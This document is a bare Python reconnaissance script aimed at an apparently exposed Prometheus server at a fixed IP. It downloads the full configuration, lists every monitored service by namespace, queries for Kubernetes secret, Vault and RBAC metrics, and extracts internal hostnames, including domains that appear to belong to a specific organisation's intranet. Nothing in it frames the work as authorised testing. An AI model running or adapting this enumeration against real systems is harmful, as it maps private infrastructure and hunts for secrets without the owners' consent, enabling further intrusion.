import requests, json
requests.packages.urllib3.disable_warnings()

base = "http://198.18.19.18:9090"

# ============================================================
# 1. Get Prometheus config — reveals all service URLs

r = requests.get(f"{base}/api/v1/status/config")
config_yaml = r.json()["data"]["yaml"]

# Save it : it's 209KB 
with open("prometheus_config.yaml", "w") as f:
    f.write(config_yaml)
print("Config saved: ALL scrape targets with URLs")

# Extract URLs from config
import re
urls = re.findall(r'https?://[^\s\'"]+', config_yaml)
print(f"\nFound {len(urls)} URLs in config:")
#for url in sorted(set(urls)):
#    print(f"  {url}")
    
# ============================================================
# 2. Get active targets / every monitored service

r = requests.get(f"{base}/api/v1/targets")
data = r.json()["data"]

print(f"\nActive targets: {len(data['activeTargets'])}")
print(f"Dropped targets: {len(data['droppedTargets'])}")

# Extract unique service URLs
services = {}
for target in data["activeTargets"]:
    labels = target.get("labels", {})
    job = labels.get("job", "unknown")
    instance = labels.get("instance", "")
    namespace = labels.get("namespace", "")
    health = target.get("health", "")
    
    services[instance] = {
        "job": job,
        "namespace": namespace,
        "health": health,
        "labels": labels
    }

# Print organized by namespace
from collections import defaultdict
by_ns = defaultdict(list)
for instance, info in services.items():
    by_ns[info["namespace"]].append(
        f"{info['job']:40} {instance}"
    )

for ns in sorted(by_ns.keys()):
    print(f"\n  [{ns}]")
    for svc in sorted(by_ns[ns]):
        print(f"    {svc}")
        
        
# ============================================================  
# 3. Query for secrets and sensitive data in metric labels

sensitive_queries = [
    # K8s secrets info
    'kube_secret_info',
    # All pods with their images (reveals versions, private registries)
    'kube_pod_info',
    # All namespaces
    'kube_namespace_labels',
    # Service accounts
    'kube_pod_spec_volumes_persistentvolumeclaims_info',
    # Vault specific metrics
    'vault_secret_lease_count_by_auth',
    'vault_core_active',
    # User/auth related
    '{job=~".*rbac.*"}',
    '{job=~".*gatekeeper.*"}',
    '{job=~".*vault.*"}',
    # Sparrow specific
    '{job=~".*sparrow.*"}',
    '{job=~".*sparrot.*"}',
]

for query in sensitive_queries:
    r = requests.get(f"{base}/api/v1/query",
                    params={"query": query},
                    timeout=10)
    if r.status_code == 200:
        results = r.json()["data"]["result"]
        if results:
            print(f"\n✓ '{query}': {len(results)} results")
            for res in results[:3]:
                print(f"  {json.dumps(res.get('metric', {}))[:200]}")
                
# ============================================================
# 4. Extract internal URLs from targets preview
# ============================================================
# From the scan preview we can see:
# "https://gatekeeper.studio.sparrow.cloud.echonet.net.intra/monitoring/live"


r = requests.get(f"{base}/api/v1/targets", timeout=30)
raw = r.text

# Find all internal URLs
internal_urls = set(re.findall(
    r'https?://[a-zA-Z0-9\-\.]+\.(?:intra|internal|local|cluster\.local)'
    r'(?::\d+)?(?:/[^\s\'"",}]*)?', 
    raw
))
print(f"\nInternal URLs found ({len(internal_urls)}):")
for url in sorted(internal_urls):
    print(f"  {url}")

# Also find echonet URLs
echonet_urls = set(re.findall(
    r'https?://[a-zA-Z0-9\-\.]+\.echonet[^\s\'"",}]*',
    raw
))
print(f"\nEchonet URLs ({len(echonet_urls)}):")
for url in sorted(echonet_urls):
    print(f"  {url}")
    
    
               
